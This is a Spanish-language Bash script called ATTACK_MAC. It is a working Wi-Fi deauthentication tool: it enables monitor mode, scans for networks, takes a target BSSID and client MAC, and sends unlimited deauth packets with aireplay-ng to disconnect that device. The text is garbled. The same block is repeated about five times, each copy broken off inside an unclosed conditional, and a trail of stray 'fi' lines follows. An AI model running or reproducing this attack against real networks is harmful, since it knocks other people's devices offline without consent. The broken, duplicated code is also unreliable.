echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."

#!/bin/bash

echo "                  ,___ "
echo "                 / O\_\\"
echo "               _/   \__|"
echo "              / \  '\\"
echo "             (  .\_  / \""
echo "             /\    \(/  \\"
echo "            /'(/   /\(/ /"
echo "           /''/(/ /\\\(/"
echo "          ////  (/ """
echo " ██████████ATTACK_MAC██████████"
echo "   °-POWERED BY: MRBEAST-° "

echo "Información de la herramienta: Esta herramienta realiza ataques de deautentificación en redes Wi-Fi."


# Preguntar al usuario si desea continuar
read -p "Tu Internet Se Apagara ¿Desea continuar? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Activando modo Monitor..."
  # Aquí colocarías tus comandos a ejecutar
  # ...
else
  # Si la respuesta es diferente de "s", salir del script
  echo "Saliendo del script..."
  exit 0
fi

sudo airmon-ng start wlan0


band="a"

# Función para mostrar un menú de opciones de banda
function select_band {
    echo "Seleccione la banda:"
    echo "1. 2.4 GHz"
    echo "2. 5 GHz"
    read option
    case $option in
        1) band="g" ;;
        2) band="a" ;;
        *) echo "Opción inválida. Se seleccionará 5 GHz por defecto." ; band="a" ;;
    esac
}

# Mostrar el menú y permitir al usuario seleccionar la banda
select_band

# Escaneo inicial para mostrar todas las redes
echo "Escaneando redes en la banda $band..."
sudo airodump-ng --band $band wlan0mon

# Solicitar al usuario el canal y BSSID
read -p "Ingrese el canal (CH): " channel
read -p "Ingrese el BSSID: " bssid

# Escaneo detallado del canal y BSSID seleccionados
echo "Escaneando el canal $channel y BSSID $bssid..."
sudo airodump-ng --band $band -c $channel --bssid $bssid wlan0mon

# Solicitar al usuario la contraseña, BSSID y dirección MAC del dispositivo
read -p "Ingrese la contraseña de root: "
read -p "Ingrese el BSSID: " bssid
read -p "Ingrese la dirección MAC del dispositivo: " mac

# Ataque de deautentificación (ajusta el número de paquetes según sea necesario)
echo "Iniciando ataque de deautentificación..."
sudo aireplay-ng -0 0 -a $bssid -c $mac wlan0mon

# Mensaje de finalización
echo "Ataque finalizado."


# Preguntar al usuario si desea continuar
read -p "¿Desea Apagar El Modo Monitor y salir de ATTACK_MAC? (S/N): " respuesta

# Convertir la respuesta a minúsculas para una comparación más sencilla
respuesta=$(echo "$respuesta" | tr '[:upper:]' '[:lower:]')

# Evaluar la respuesta
if [[ "$respuesta" == "s" ]]; then
  # Si la respuesta es "s", ejecutar los comandos
  echo "Desactivando modo Monitor..."
  sudo airmon-ng stop wlan0mon
else
  # Si la respuesta es diferente de "s", salir del script
  echo "REINICIANDO..."








 
fi
 
fi
 
fi
 
fi
 
fi
 
fi
 
fi
 
fi
 
fi
 
fi
 
fi
 
fi
 
fi

fi
 
fi
 
fi
 
fi










